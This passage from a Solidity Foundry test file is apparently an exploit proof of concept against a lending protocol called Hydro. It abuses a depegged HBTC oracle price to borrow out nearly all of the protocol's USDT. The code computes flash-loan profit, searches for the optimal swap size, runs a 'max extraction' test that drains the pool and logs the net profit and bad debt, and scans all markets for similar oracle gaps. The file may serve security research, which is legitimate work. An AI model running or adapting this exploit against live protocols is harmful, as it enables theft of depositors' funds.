        // Cost analysis: we need to repay WBTC flash loan
        uint256 wbtcOraclePrice = IHydro(HYDRO).getAssetOraclePrice(WBTC);
        uint256 wbtcCostUSDT = optimalWbtc * wbtcOraclePrice / 1e8 / 1e18; // WBTC cost in USDT terms (6 dec)
        uint256 flashFee = wbtcCostUSDT * 5 / 10000; // 0.05%
        uint256 totalCost = wbtcCostUSDT + flashFee;

        console.log("WBTC flash loan cost:", totalCost / 1e6, "USDT");
        console.log("Flash fee:", flashFee / 1e6, "USDT");

        if (usdtGained > totalCost) {
            console.log(">>> NET PROFIT:", (usdtGained - totalCost) / 1e6, "USDT <<<");
        } else {
            console.log(">>> NET LOSS:", (totalCost - usdtGained) / 1e6, "USDT <<<");
        }
    }

    function _findOptimalWbtcAmount(ICurvePool pool) internal view returns (uint256) {
        uint256 hbtcOraclePrice = IHydro(HYDRO).getAssetOraclePrice(HBTC);
        uint256 wbtcOraclePrice = IHydro(HYDRO).getAssetOraclePrice(WBTC);
        IHydro.Market memory mkt = IHydro(HYDRO).getMarket(5);

        uint256 bestProfit = 0;
        uint256 bestAmount = 0;

        // Search from 0.001 to 1.0 WBTC in steps
        for (uint256 sat = 1e5; sat <= 1e8; sat = sat * 12 / 10) {
            try pool.get_dy(1, 0, sat) returns (uint256 hbtcOut) {
                uint256 collateralUSD = hbtcOut * hbtcOraclePrice / 1e18;
                uint256 maxBorrowUSD = collateralUSD * 1e18 / mkt.withdrawRate;
                uint256 wbtcCostUSD = sat * wbtcOraclePrice / 1e8;
                uint256 flashFee = wbtcCostUSD * 5 / 10000;

                if (maxBorrowUSD > wbtcCostUSD + flashFee) {
                    uint256 profit = maxBorrowUSD - wbtcCostUSD - flashFee;
                    if (profit > bestProfit) {
                        bestProfit = profit;
                        bestAmount = sat;
                    }
                }
            } catch {
                break; // Exceeds pool liquidity
            }
        }
        return bestAmount;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 11: Maximum extraction with market-price HBTC acquisition
    //  If attacker can acquire HBTC at ~$29K market price off-chain
    // ════════════════════════════════════════════════════════════════════════
    function test_11_max_extraction_market_price() public {
        address attacker = address(this);

        console.log("=== MAX EXTRACTION: HBTC AT MARKET PRICE ===");
        console.log("Assumes HBTC acquired at ~$29,421 per HBTC (CoinGecko)");
        console.log("");

        // How much USDT is available in Hydro?
        uint256 usdtAvail = IHydro(HYDRO).getTotalSupply(USDT) - IHydro(HYDRO).getTotalBorrow(USDT);
        console.log("USDT available in Hydro:", usdtAvail / 1e6, "USDT");

        uint256 hbtcOraclePrice = IHydro(HYDRO).getAssetOraclePrice(HBTC);
        uint256 usdtOraclePrice = IHydro(HYDRO).getAssetOraclePrice(USDT);
        IHydro.Market memory mkt = IHydro(HYDRO).getMarket(5);

        // Per 1 HBTC (1e18 wei): collateral value in Hydro internal units
        uint256 collateralValuePer1HBTC = 1e18 * hbtcOraclePrice / 1e18;
        // Max debt value = collateralValue / withdrawRate
        uint256 maxDebtValue = collateralValuePer1HBTC * 1e18 / mkt.withdrawRate;
        // Convert debt value to USDT units: debtValue = B * usdtPrice / 1e18
        // So B = debtValue * 1e18 / usdtPrice
        uint256 maxUSDTper1HBTC = maxDebtValue * 1e18 / usdtOraclePrice;
        console.log("Max USDT borrow per 1 HBTC:", maxUSDTper1HBTC / 1e6, "USDT");
        console.log("Oracle price per HBTC (USD):", hbtcOraclePrice / 1e18);

        // HBTC needed to drain entire pool
        uint256 hbtcNeeded = usdtAvail * 1e18 / maxUSDTper1HBTC;
        console.log("HBTC needed to drain pool:", hbtcNeeded / 1e15, "mHBTC");
        console.log("Cost at $29,421/HBTC:", hbtcNeeded * 29421 / 1e18, "USD");
        console.log("Revenue (USDT extracted):", usdtAvail / 1e6, "USDT");
        uint256 profitIfDrained = usdtAvail / 1e6 - hbtcNeeded * 29421 / 1e18;
        console.log("NET PROFIT if drained:", profitIfDrained, "USD");

        // Actually test with maximum possible
        // Use 18 HBTC (enough to drain the pool)
        uint256 hbtcAmount = 19 ether;
        deal(HBTC, attacker, hbtcAmount);

        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);
        IERC20(HBTC).approve(HYDRO, hbtcAmount);

        // Borrow all available USDT
        uint256 borrowAmount = usdtAvail * 98 / 100; // 98% to leave margin
        console.log("Attempting to borrow USDT:", borrowAmount / 1e6);
        console.log("With HBTC collateral:", hbtcAmount / 1e18);

        Action[] memory actions = new Action[](5);
        actions[0] = Action(0, abi.encode(HBTC, hbtcAmount));
        actions[1] = Action(2, abi.encode(
            HBTC,
            uint8(0), uint16(0), attacker,
            uint8(1), uint16(5), attacker,
            hbtcAmount
        ));
        actions[2] = Action(3, abi.encode(uint16(5), USDT, borrowAmount));
        actions[3] = Action(2, abi.encode(
            USDT,
            uint8(1), uint16(5), attacker,
            uint8(0), uint16(0), attacker,
            borrowAmount
        ));
        actions[4] = Action(1, abi.encode(USDT, borrowAmount));

        (bool success, bytes memory ret) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));

        if (!success) {
            if (ret.length >= 68) {
                bytes memory stripped = new bytes(ret.length - 4);
                for (uint x = 4; x < ret.length; x++) stripped[x-4] = ret[x];
                console.log("Revert:", abi.decode(stripped, (string)));
            }
            // Binary search for max borrowable
            console.log("Binary searching for max borrow...");
            borrowAmount = _binarySearchMaxBorrow(hbtcAmount, usdtAvail);
            if (borrowAmount == 0) {
                console.log("Could not find working borrow amount");
                return;
            }
            // Retry
            actions[2] = Action(3, abi.encode(uint16(5), USDT, borrowAmount));
            actions[3] = Action(2, abi.encode(
                USDT,
                uint8(1), uint16(5), attacker,
                uint8(0), uint16(0), attacker,
                borrowAmount
            ));
            actions[4] = Action(1, abi.encode(USDT, borrowAmount));

            (success,) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));
            require(success, "Final borrow attempt failed");
        }

        uint256 usdtGained = IERC20(USDT).balanceOf(attacker) - usdtBefore;
        uint256 hbtcRemaining = IERC20(HBTC).balanceOf(attacker);
        uint256 hbtcUsed = hbtcAmount - hbtcRemaining;

        console.log("");
        console.log("=== MAX EXTRACTION RESULTS ===");
        console.log("HBTC deposited:", hbtcUsed / 1e18, "HBTC");
        console.log("USDT extracted:", usdtGained / 1e6, "USDT");
        console.log("Cost at $29,421/HBTC:", hbtcUsed * 29421 / 1e18, "USD");
        console.log("NET PROFIT:", usdtGained / 1e6 - hbtcUsed * 29421 / 1e18, "USD");
        console.log("Bad debt created in Hydro:", usdtGained / 1e6, "USDT (collateral is depegged)");
    }

    function _binarySearchMaxBorrow(uint256 hbtcAmount, uint256 maxUsdt) internal returns (uint256) {
        uint256 lo = 1e6; // 1 USDT
        uint256 hi = maxUsdt;
        uint256 best = 0;

        for (uint i = 0; i < 40; i++) {
            uint256 mid = (lo + hi) / 2;
            if (mid < lo) break;

            // Snapshot and try
            uint256 snap = vm.snapshot();

            Action[] memory actions = new Action[](5);
            actions[0] = Action(0, abi.encode(HBTC, hbtcAmount));
            actions[1] = Action(2, abi.encode(
                HBTC,
                uint8(0), uint16(0), address(this),
                uint8(1), uint16(5), address(this),
                hbtcAmount
            ));
            actions[2] = Action(3, abi.encode(uint16(5), USDT, mid));
            actions[3] = Action(2, abi.encode(
                USDT,
                uint8(1), uint16(5), address(this),
                uint8(0), uint16(0), address(this),
                mid
            ));
            actions[4] = Action(1, abi.encode(USDT, mid));

            (bool ok,) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));

            vm.revertTo(snap);

            if (ok) {
                best = mid;
                lo = mid + 1;
            } else {
                hi = mid - 1;
            }
        }
        console.log("Binary search found max borrow:", best / 1e6, "USDT");
        return best;
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 12: Check ALL Hydro markets for similar depeg opportunities
    // ════════════════════════════════════════════════════════════════════════
    function test_12_all_market_depeg_scan() public view {
        console.log("=== DEPEG SCAN: ALL HYDRO MARKETS ===");
        console.log("Looking for oracle price != market price for any asset");
        console.log("");

        uint256 marketsCount = IHydro(HYDRO).getAllMarketsCount();

        for (uint16 i = 0; i < marketsCount; i++) {
            IHydro.Market memory m = IHydro(HYDRO).getMarket(i);
            console.log("Market", i, ":");
            console.log("  base:", m.baseAsset);
            console.log("  quote:", m.quoteAsset);
            console.log("  borrow:", m.borrowEnable);

            if (m.borrowEnable) {
                // Get oracle prices for both assets
                try IHydro(HYDRO).getAssetOraclePrice(m.baseAsset) returns (uint256 basePrice) {
                    console.log("  base oracle USD:", basePrice / 1e18);
                } catch {
                    console.log("  base oracle: FAILED");
                }
                try IHydro(HYDRO).getAssetOraclePrice(m.quoteAsset) returns (uint256 quotePrice) {
                    console.log("  quote oracle USD:", quotePrice / 1e18);
                } catch {
                    console.log("  quote oracle: FAILED");
                }

                // Check pool state
                try IHydro(HYDRO).getTotalSupply(m.quoteAsset) returns (uint256 qs) {
                    uint256 qb = IHydro(HYDRO).getTotalBorrow(m.quoteAsset);
                    console.log("  quote available:", qs > qb ? qs - qb : 0);
                } catch {}
                try IHydro(HYDRO).getTotalSupply(m.baseAsset) returns (uint256 bs) {
                    uint256 bb = IHydro(HYDRO).getTotalBorrow(m.baseAsset);
                    console.log("  base available:", bs > bb ? bs - bb : 0);
                } catch {}
            }
            console.log("");
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    //  TEST 13: HBTC on-chain price discovery via actual swaps
    // ════════════════════════════════════════════════════════════════════════
    function test_13_hbtc_actual_swap_prices() public view {
        console.log("=== HBTC ACTUAL ON-CHAIN PRICES ===");

        // 1. Curve: HBTC -> WBTC price for 1 HBTC
        ICurvePool curve = ICurvePool(CURVE_HBTC_POOL);
        try curve.get_dy(0, 1, 1e18) returns (uint256 wbtcFor1HBTC) {
            uint256 wbtcPrice = IHydro(HYDRO).getAssetOraclePrice(WBTC);
            uint256 hbtcUSDViaCurve = wbtcFor1HBTC * wbtcPrice / 1e8;
            console.log("Curve: 1 HBTC -> ", wbtcFor1HBTC, "satoshi WBTC");
            console.log("  Effective HBTC price via Curve:", hbtcUSDViaCurve / 1e18, "USD");
        } catch {
            console.log("Curve: 1 HBTC swap reverts (pool too imbalanced)");
        }

        // 2. Check if there's a Uniswap V2 HBTC/WETH pair with real liquidity
        address uniPair = IUniswapV2Factory(UNI_V2_FACTORY).getPair(HBTC, WETH);
        if (uniPair != address(0)) {
            (uint112 r0, uint112 r1,) = IUniswapV2Pair(uniPair).getReserves();
            if (r0 > 0 && r1 > 0) {
                address t0 = IUniswapV2Pair(uniPair).token0();
                uint256 hbtcRes = t0 == HBTC ? uint256(r0) : uint256(r1);
                uint256 wethRes = t0 == HBTC ? uint256(r1) : uint256(r0);
                uint256 ethPrice = IHydro(HYDRO).getAssetOraclePrice(ETH_ADDR);

                // Price of 1 HBTC in WETH
                uint256 hbtcInWeth = wethRes * 1e18 / hbtcRes;
                uint256 hbtcUSD = hbtcInWeth * ethPrice / 1e18 / 1e18;
                console.log("UniV2 HBTC/WETH price (mWETH):", hbtcInWeth / 1e15);
                console.log("UniV2 HBTC/WETH price (USD):", hbtcUSD);
                console.log("  HBTC reserves:", hbtcRes / 1e15, "mHBTC");
                console.log("  WETH reserves:", wethRes / 1e15, "mWETH");
            }
        }

        // 3. Summary: compare on-chain vs oracle
        console.log("");
        console.log("=== PRICE COMPARISON ===");
        console.log("Hydro HBTC oracle:", IHydro(HYDRO).getAssetOraclePrice(HBTC) / 1e18, "USD");
        console.log("CoinGecko market: ~29,421 USD");
        console.log("Depeg severity: Oracle is", IHydro(HYDRO).getAssetOraclePrice(HBTC) * 100 / 1e18 / 29421, "% of market price");
    }
}
